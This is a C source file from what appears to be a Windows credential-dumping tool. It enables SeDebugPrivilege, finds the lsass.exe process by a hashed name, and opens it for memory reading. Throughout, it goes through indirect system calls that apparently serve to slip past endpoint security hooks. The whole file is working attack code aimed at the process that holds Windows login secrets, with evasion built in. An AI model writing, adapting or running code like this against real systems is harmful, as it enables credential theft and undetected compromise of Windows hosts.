#include "GetProc.h"

identity_t lsassHash = IDENTITY("lsass.exe");

BOOL SetDebugPriv() {
    HANDLE              hToken      = NULL;
    TOKEN_PRIVILEGES    tokenPriv   = {0};
    NTSTATUS            ntStatus    = 0x00;
    LPCWSTR             lpwPriv;

    SetSsn(g_SyscallApi.NtOpenProcessToken.dwSsn, g_SyscallApi.NtOpenProcessToken.pSyscallInstAddress);
    ntStatus = RunSyscall(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken, NULL);
    if (!NT_SUCCESS(ntStatus)) {
#ifdef DEBUG
        printf("[!] NtOpenProcessToken failed with error: %#010x [%d]\n", ntStatus, __LINE__);
#endif
        return FALSE;
    }
    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    lpwPriv = L"SeDebugPrivilege";
    if (!LookupPrivilegeValueW(NULL, lpwPriv, &tokenPriv.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    SetSsn(g_SyscallApi.NtAdjustPrivilegesToken.dwSsn, g_SyscallApi.NtAdjustPrivilegesToken.pSyscallInstAddress);
    ntStatus = RunSyscall6(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (!NT_SUCCESS(ntStatus)) {
#ifdef DEBUG
        printf("[!] NtAdjustPrivilegesToken failed with error: %#010x [%d]\n", ntStatus, __LINE__);
#endif
        return FALSE;
    }

    if (hToken) CloseHandle(hToken);
    return TRUE;
}

NTSTATUS GetProcHandle(IN unsigned long long ProcHash, OUT PHANDLE hProc) {
    PVOID       pBuffer     = NULL;
    ULONG       cbBuffer    = 131072;
    HANDLE      hHeap       = NULL;
    NTSTATUS    ntStatus    = 0x00;
    PCHAR       utf8Str     = NULL;

    CLIENT_ID                   clientId;
    OBJECT_ATTRIBUTES           objAttributes;
    PSYSTEM_PROCESS_INFORMATION pSysProcInfo;

    hHeap = GetProcessHeap();
    if (hHeap == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
        printf("[!] GetProcessHeap failed with error: %lu [%d]\n", GetLastError(), __LINE__);
#endif
        return STATUS_UNSUCCESSFUL;
    }

    while(TRUE) {
        printf("[i] Current buffer size is: %lu bytes\n", cbBuffer);
        pBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cbBuffer);
        if (!pBuffer) {
#ifdef DEBUG
            printf("[!] HeapAlloc failed with error: %lu [%d]\n", GetLastError(), __LINE__);
#endif
            goto _CLEAN_UP;
        }
        SetSsn(g_SyscallApi.NtQuerySystemInformation.dwSsn, g_SyscallApi.NtQuerySystemInformation.pSyscallInstAddress);
        ntStatus = RunSyscall(5, pBuffer, cbBuffer, &cbBuffer);
        if (ntStatus == STATUS_INFO_LENGTH_MISMATCH) {
#ifdef DEBUG
            printf("[i] NtQuerySystemInformation failed with error: STATUS_INFO_LENGTH_MISMATCH, increasing buffer size...\n");
            printf("[i] Current buffer size is: %lu bytes\n", cbBuffer);
#endif
            HeapFree(hHeap, NULL, pBuffer);
            cbBuffer *= 2;
        } else if (!NT_SUCCESS(ntStatus)) {
#ifdef DEBUG
            printf("[!] NtQuerySystemInformation failed with error: %#010x [%d]\n", ntStatus, __LINE__);
#endif
            goto _CLEAN_UP;
        } else {
            break;
        }
    }

    pSysProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
    while (pSysProcInfo->NextEntryOffset) {
#ifdef DEBUG
        printf("\nProcess: %ls | PID: %d\n", pSysProcInfo->ImageName.Buffer, pSysProcInfo->ProcessId);
#endif
        utf8Str = UnicodeStringToUtf8(&pSysProcInfo->ImageName);
        printf("hash: %llu, compare: %llu\n", IdentityRuntime(utf8Str), ProcHash);
        if (IdentityRuntime(utf8Str) == ProcHash) {
            InitializeObjectAttributes(&objAttributes, NULL, 0, NULL, NULL);
            objAttributes.SecurityQualityOfService = 0;
            clientId.UniqueProcess = (PVOID)pSysProcInfo->ProcessId;
            clientId.UniqueThread = 0;
            SetSsn(g_SyscallApi.NtOpenProcess.dwSsn, g_SyscallApi.NtOpenProcess.pSyscallInstAddress);
            ntStatus = RunSyscall(hProc, PROCESS_VM_READ, &objAttributes, &clientId);
            if (!NT_SUCCESS(ntStatus)) {
#ifdef DEBUG
                printf("[!] NtOpenProcess failed with error: %#010x [%d]\n", ntStatus, __LINE__);
#endif
                goto _CLEAN_UP;
            }
            break;
        }
        pSysProcInfo = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pSysProcInfo + pSysProcInfo->NextEntryOffset);
    }
    if (pBuffer) HeapFree(hHeap, NULL, pBuffer);
    return STATUS_SUCCESS;

    _CLEAN_UP:
    if (pBuffer) HeapFree(hHeap, NULL, pBuffer);
    return STATUS_UNSUCCESSFUL;
}